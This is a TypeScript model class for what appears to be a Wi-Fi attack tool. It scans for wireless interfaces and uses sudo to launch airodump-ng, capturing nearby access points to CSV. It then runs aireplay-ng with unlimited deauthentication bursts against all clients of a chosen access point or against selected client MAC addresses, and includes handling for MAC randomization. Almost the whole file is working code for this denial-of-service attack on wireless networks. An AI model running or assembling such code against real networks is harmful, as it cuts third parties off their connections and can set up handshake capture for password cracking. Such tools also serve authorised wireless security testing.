/*
* Implementation of data model.
*/

import os from 'os';
import fs from 'fs';
import { ChildProcess, spawn } from 'child_process';
import NetworkInterfaceController from './networkInterfaceController';
import Utils from '../utils';
import AccessPoint from './accessPoint';
import StreamHandler from '../streamHandler';
import path from 'path';

const CAPTURED_WAPS = path.resolve(__dirname, '../public/capturedwaps/capturedWAPS');
const CSV_PREFIX = '-01.csv';

class Model {
  networkInterfaceControllers: NetworkInterfaceController[];
  accessPoints: AccessPoint[];
  macRandomized: boolean;
  bandFlags: string[];
  usedNetworkInterfaceController!: NetworkInterfaceController;
  usedAccessPoint!: AccessPoint;
  scanProcess!: ChildProcess;
  deauthenticationProcesses: ChildProcess[];

  constructor() {
    this.networkInterfaceControllers = [];
    this.accessPoints = [];
    this.macRandomized = false;
    this.bandFlags = [];
    this.deauthenticationProcesses = [];
  }

  public scanNetworkInterfaceControllers = () => {
    const interfaces: NodeJS.Dict<os.NetworkInterfaceInfo[]> = os.networkInterfaces();
    const net_dir = '/sys/class/net';
    this.networkInterfaceControllers = [];
    for (const [address, iface] of Object.entries(interfaces)) {
      if (!iface) {
        return;
      }
      if (!fs.existsSync(`${net_dir}/${address}/wireless`)) {
        continue;
      }
      for (let i = 0; i < iface.length; i += 1) {
        if (iface[i].family === 'IPv4' && iface[i].internal === false) {
          const nic = new NetworkInterfaceController(iface[i], address);
          this.networkInterfaceControllers[address] = nic;
        }
      }
    }
  }

  public scanAccessPoints = async () => {
    this.accessPoints = [];
    Utils.deleteCaptures();
    this.scanProcess = spawn('sudo', ['airodump-ng', '--band', this.bandFlags.join(''), '-w',
      CAPTURED_WAPS, '--write-interval', '1', '--output-format', 'csv', this.usedNetworkInterfaceController.name]);
    await StreamHandler.process(this.scanProcess, CAPTURED_WAPS + CSV_PREFIX);
  }

  public stopScanningAccessPoints = async () => {
    this.scanProcess.kill('SIGINT');
    Utils.deleteClientsFromCsv(CAPTURED_WAPS + CSV_PREFIX);
    this.accessPoints = await Utils.readAccessPointsFromCsv(CAPTURED_WAPS + CSV_PREFIX);
  }

  public reset = () => {
    if (this.usedNetworkInterfaceController) {
      this.usedNetworkInterfaceController.setManagedMode();
    }
    for (let i = 0; i < this.networkInterfaceControllers.length; i += 1) {
      this.networkInterfaceControllers[i].resetMac();
    }
  }

  public scanClients = () => {
    this.usedAccessPoint.scanClients(this.usedNetworkInterfaceController.name);
  }

  private deauthenticateAllClients = async () => {
    const deauthenticationProcess = spawn('sudo', ['aireplay-ng', '-0', '0', '-a',
      this.usedAccessPoint.bssid, this.usedNetworkInterfaceController.name]);
    this.deauthenticationProcesses.push(deauthenticationProcess);
  }

  private deauthenticateClient = async (target: string) => {
    const deauthenticationProcess = spawn('sudo', ['aireplay-ng', '-0', '0', '-a',
      this.usedAccessPoint.bssid, '-c', target, this.usedNetworkInterfaceController.name]);
    this.deauthenticationProcesses.push(deauthenticationProcess);
  }

  public deauthenticate = async () => {
    if (this.deauthenticationProcesses.length != 0) {
      await this.stopDeauthentication();
    }
    if (this.usedAccessPoint.targets.length === this.usedAccessPoint.clients.length) {
      await this.deauthenticateAllClients();
      return;
    }
    const targets = this.usedAccessPoint.targets;
    for (let i = 0; i < targets.length; i += 1) {
      await this.deauthenticateClient(targets[i]);
    }
  }

  public stopDeauthentication = async () => {
    for (let i = 0; i < this.deauthenticationProcesses.length; i += 1) {
      this.deauthenticationProcesses[i].kill('SIGINT');
    }
    this.deauthenticationProcesses = [];
  }
}

export default Model;
